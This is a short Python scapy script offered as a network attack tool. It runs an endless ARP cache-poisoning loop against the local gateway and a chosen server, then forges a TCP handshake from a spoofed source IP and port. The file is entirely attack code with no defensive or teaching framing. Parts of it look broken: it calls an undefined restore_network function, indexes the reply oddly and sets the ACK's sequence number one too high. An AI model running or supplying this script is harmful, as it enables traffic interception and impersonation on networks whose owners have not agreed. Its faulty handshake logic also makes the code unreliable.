#! /usr/bin/python3

from scapy.all import *
import sys
import threading
import argparse
import time
import threading

parser = argparse.ArgumentParser(description='Spoof communication.')
parser.add_argument('server', type=str,
                    help='server IP address')
parser.add_argument('port', type=int,
                    help='server port')
parser.add_argument('spoofed_ip', type=str,
                    help='IP address to spoof')
parser.add_argument('spoofed_port', type=int,
                    help='port to spoof')
parser.add_argument('iface', type=str,
                    help='iface to use')
args = parser.parse_args()
print(args)


class Host():
    def __init__(self, ip, **kwargs):
        self.ip = ip
        self.mac = getmacbyip(self.ip) if kwargs.get("mac") is None else kwargs.get("mac")
        self.port = kwargs.get("port")


class keepArpSpoofing(threading.Thread):
    def __init__(self, gateway, destination):
        super().__init__()

        self.gateway = gateway
        self.destination = destination

    def run(self):
        try:
            while True:
                send(ARP(op=2, pdst=self.gateway.ip, hwdst=self.gateway.mac, psrc=self.destination.ip))
                send(ARP(op=2, pdst=self.destination.ip, hwdst=self.destination.mac, psrc=self.gateway.ip))
                # time.sleep(2)
        except KeyboardInterrupt:
            restore_network(self.gateway.ip, self.gateway.mac, self.destination.ip, self.destination.mac)


gateway = Host(conf.route.route(None)[2])
destination = Host(args.server, port=args.port)
source = Host(args.spoofed_ip, mac=get_if_hwaddr(args.iface), port=args.spoofed_port)

arpSpoofThread = keepArpSpoofing(gateway, destination)
arpSpoofThread.start()

basic_package_content = IP(src=source.ip, dst=destination.ip) / TCP(flags="S", seq=1234, sport=source.port,
                                                                    dport=destination.port)
layer = sr1(basic_package_content)[0][0][1].getlayer(TCP)

send(IP(src=source.ip, dst=destination.ip) / TCP(flags="A", seq=layer.ack + 1, ack=layer.seq + 1,
                                                 sport=source.port,
                                                 dport=destination.port))
